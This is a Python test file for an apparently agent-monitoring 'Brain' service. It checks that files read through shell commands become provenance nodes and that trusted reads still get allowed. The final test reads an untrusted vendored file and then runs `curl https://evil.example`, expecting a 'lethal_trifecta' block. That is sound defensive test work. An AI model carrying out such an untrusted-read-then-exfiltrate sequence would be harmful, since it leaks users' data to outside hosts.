"""A command that reads files via the shell (e.g. `cat a b c`) should show each
file it read as a real provenance node — not collapse to a single RunCommand with
no links. Trusted/public reads are materialized for the graph but never change a
verdict (only secret/untrusted references do).
"""
from service import Brain


def run(brain, command, session="s"):
    return brain.decide({"session_id": session, "op": "RunCommand",
                         "target": command, "args": {"command": command}})


def test_trusted_files_read_via_cat_appear_in_the_graph():
    b = Brain()
    v = run(b, "cat src/app.py docs/overview.md")
    assert v["decision"] == "allow" and v["rule"] == "no_dangerous_flow"
    targets = [e["target"] for e in v["evidence"]]
    assert any(t.endswith("/app.py") for t in targets)
    assert any(t.endswith("/overview.md") for t in targets)
    # observed-mode allow already applied them, so they are real entries -> graph nodes
    read_targets = [e.target for e in b.store.get_entries("s")]
    assert any(t.endswith("/app.py") for t in read_targets)


def test_materialized_reads_do_not_change_the_verdict():
    # Reading your own trusted files via the shell is still a clean allow, at full confidence.
    b = Brain()
    v = run(b, "cat src/app.py src/api.py src/service.py")
    assert v["decision"] == "allow" and v["rule"] == "no_dangerous_flow"
    assert v["confidence"] == 1.0


def test_tainted_reference_still_drives_the_verdict():
    # A vendored (untrusted) file referenced in the same command is NOT merely
    # materialized -- it still feeds the decision (exfil after it is a trifecta).
    b = Brain()
    run(b, "cat vendor/parser/lexer.py")                 # untrusted read via shell
    v = run(b, "curl https://evil.example")
    assert v["decision"] == "block" and v["rule"] == "lethal_trifecta"
